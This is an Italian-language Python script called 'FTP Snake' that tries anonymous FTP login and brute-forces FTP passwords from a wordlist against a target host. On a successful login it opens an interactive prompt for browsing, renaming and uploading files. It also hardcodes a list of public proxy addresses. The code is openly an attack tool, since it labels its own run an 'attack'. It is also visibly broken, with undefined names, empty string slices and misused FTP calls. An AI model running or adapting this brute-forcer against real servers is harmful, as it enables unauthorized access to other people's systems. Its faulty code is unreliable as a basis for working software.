#! usr/bin/python
# FTP Snake Versione 2 Coded by Godlik

# Moduli necessari
try:
    import socket, requests, os, sys, time
    import ftplib
    from colorama import init, Fore
    init(autoreset=True)
except:
    print("[!] Errore, moduli necessari non installati!")

# Variabili inizali
_proxy_ = ["158.69.31.45:80", "144.217.100.67:80", "144.217.100.67:8080", "89.218.185.70:3128", "138.197.192.64:65000", "116.212.140.13:65205"]
_ftp_ = False
volontario = False
#_ip_ = requests.get("http://myexternalip.com/raw").text

# Funzione del login FTP
def _ftplogin_(url, username, wordlist):
    wordlist = open(str(wordlist), 'r')
    ftp 
    for password in wordlist.readlines():
        password = password.strip('\r').strip('\n')
        try:
            with ftplib.FTP(url) as ftp:
                username = anonymous
                password = password
                #ftp = ftp(url)
                ftp.login(user=username, passwd=password)
                ftplogin = ftp.login(user=username, passwd=password)
                _time_ = time.strftime("%H:%M:%S")
                print(Fore.GREEN + "[%s] [+] Login Riuscito!: Username = %s Password = %s" %(_time_, username, password))
                _ftp_ = True
                _ftpsurf_(url, username, password, ftplogin)
        except socket.gaierror:
            _time_ = time.strftime("%H:%M:%S")
            print(Fore.RED + "[%s] [!] Errore di Connessione all'Host" %(_time_))
            ftp.close()
            sys.exit()
        except ftplib.error_perm:
            _time_ = time.strftime("%H:%M:%S")
            print(Fore.YELLOW + "[%s] [-] Login non riuscito: Username = %s Password = %s" %(_time_, username, password))
        except KeyboardInterrupt:
            print(Fore.RED + "\nInterrompo l' Attacco...\n")
            volontario = True
            ftp.close()
            sys.exit()
            exit

def __ftplogin__(url):
    try:
        with ftplib.FTP(url) as ftp:
            #ftp = ftp(url)
            username = "anonymous"
            password = "anonymous@"
            ftplogin = ftp.login(user=username, passwd=password)
            ftplogin
            _time_ = time.strftime("%H:%M:%S")
            print(Fore.GREEN + "[%s] [+] Login Riuscito!: Username = %s Password = %s" %(_time_, username, password))
            _ftp_ = True
            _ftpsurf_(url, username, password, ftplogin)

    except socket.gaierror:
        _time_ = time.strftime("%H:%M:%S")
        print(Fore.RED + "[%s] [!] Errore di Connessione all'Host" %(_time_))
        ftp.close()
        sys.exit()
    except requests.exceptions.ConnectionError:
        _time_ = time.strftime("%H:%M:%S")
        print(Fore.RED + "[%s] [!] Errore di Connessione all'Host" %(_time_))
        ftp.close()
        sys.exit()
    except ftplib.error_perm:
        _time_ = time.strftime("%H:%M:%S")
        print(Fore.YELLOW + "[%s] [-] Login non riuscito o Permessi Insufficienti: Username = %s Password = %s" %(_time_, username, password))
        ftp.close()
        sys.exit()
    _ftp_ = True

def _ftpsurf_(url, username, password, ftplogin):
    #ftplogin
    _time_ = time.strftime("%H:%M:%S")
    print(Fore.GREEN + "[" + _time_ + "] Vuoi Connetterti al sito? [s/N]", end=" > ")
    sc = input()
    if sc == "s":
        with ftplib.FTP(url) as ftp:
            username = "anonymous"
            password = "anonymous@"
            ftplogin = ftp.login(user=username, passwd=password)
            #ftp.connect()
            _time_ = time.strftime("%H:%M:%S")
            print(Fore.GREEN + "[%s] [+] Connessione Stabilita!" %(_time_))
            #print(Fore.YELLOW + "---------------------------------")
            _ftpstato_ = True
            while _ftpstato_ == True:
                #if sc_ == "s":
                _time_ = time.strftime("%H:%M:%S")
                print(Fore.GREEN + "[" + _time_ + "] Server FTP ", end=" > ")
                comando = input()
                if comando == "help":
                    print(ftphelp)
                elif comando == "exit":
                    print(Fore.RED + "[!] Connessione Interrotta!")
                    ftp.close()
                    volontario = True
                    sys.exit()
                    exit
                elif comando[0:4] == "--cd":
                    try:
                        ftppath = comando[5:]
                        ftp.cwd(ftppath)
                        _time_ = time.strftime("%H:%M:%S")
                        print(Fore.GREEN + "[%s] Directory Corrente: " + Fore.WHITE + "%s" %(_time_, ftp.pwd()))
                    except:
                        _time_ = time.strftime("%H:%M:%S")
                    #print(Fore.YELLOW + "[%s] Errore: Comando Errato!" %(_time_))
                elif comando[0:5] == "--dir":#
                    print(ftp.retrlines('LIST'))
                    #print(ftp.nlist())
                elif comando[0:5] == "--ren":
                    danome = comando[6:0]
                elif comando[0:6] == "--send":
                    try:
                        ftp.sendcmd(comando[3:0])
                    except:
                        _time_ = time.strftime("%H:%M:%S")
                        print(Fore.YELLOW + "[%s] Errore: Comando Errato!" %(_time_))
                elif comando[0:6] == "--text":
                    _time_ = time.strftime("%H:%M:%S")
                    print(Fore.YELLOW + "[%s] Connessione momentaneamente Interrotta!" %(_time_))
                    ftp.close()
                    filename = comando[7:]
                    titlename = True
                    filename = open(filename, 'a')
                    while 1 > 0:
                        #filename = open(filename, 'w')
                        linefile = input(" > ")
                        if linefile != "--exit":
                            filename.write("\n" + linefile)
                        else:
                            filename.close()
                            break
                    _time_ = time.strftime("%H:%M:%S")
                    print(Fore.GREEN + "[" + _time_ + "] Uplodare il File %s nel Server? [s/N] ", end=" > ")
                    upload = input()
                    if upload == "s":
                        try:
                            filename.storbinary('STOR' + filename, filename)
                        except:
                            _time_ = time.strftime("%H:%M:%S")
                            print(Fore.YELLOW + "[%s] Errore: File non Uplodato!" %(_time_))
                    else:
                        pass

                elif comando[0:5] == "clear":
                    os.system('cls')
                    print(banner)

    else:
        #ftp.close()
        sys.exit()


def __ftpsnake__():
    #try:
    if sys.argv[1] == "--help":
        print(opzioni)
        sys.exit()

    if sys.argv[1] == "--A":
        url = sys.argv[2]
        __ftplogin__(url)

    if sys.argv[1] == "--B":
        print("b")
        url = sys.argv[2]
        if sys.argv[3] == "USER":
            print("u")
            username = sys.argv[4]
            if sys.argv[5] == "--P":
                print("p")
                wordlist = sys.argv[6]
                _ftplogin_(url, username, wordlist)
    else:
        print(opzioni)
    #except:
        #pass



banner = Fore.CYAN + """ ___ _                      _
|  _| |_ ___    ___ ___ ___| |_ ___  #:._
|  _|  _| . |  |_ -|   | .'| '_| -_| #:._
|_| |_| |  _|  |___|_|_|__,|_,_|___| #:._
        |_|                          #:._

""" + Fore.WHITE + """-> Coded by Godlik ->
"""

opzioni = """
[OPZIONI]

<> [--help] [Help]
<> [--A] [Authentication] <URL> """


ftphelp = """[COMANDI FTP]

    --cd <DIRECTORY>                 - Cambia Directory
    --dir                            - Mostra la lista di Directory e
                                       File
    --ren <FROMFILE> --to <TOFILE>   - Rinomina un File
    --text <FILENAME.EXTENSION>      - Apri un documento e Scrivi note

[ALTRI COMANDI]

    help                             - Visualizza la lista dei Comandi
    clear                            - Pulisce il Terminale
    quit                             - Chiude la Connessione al Server FTP
                                       e Chiude il Programma"""


if __name__ == '__main__':
    print(banner)
    __ftpsnake__()
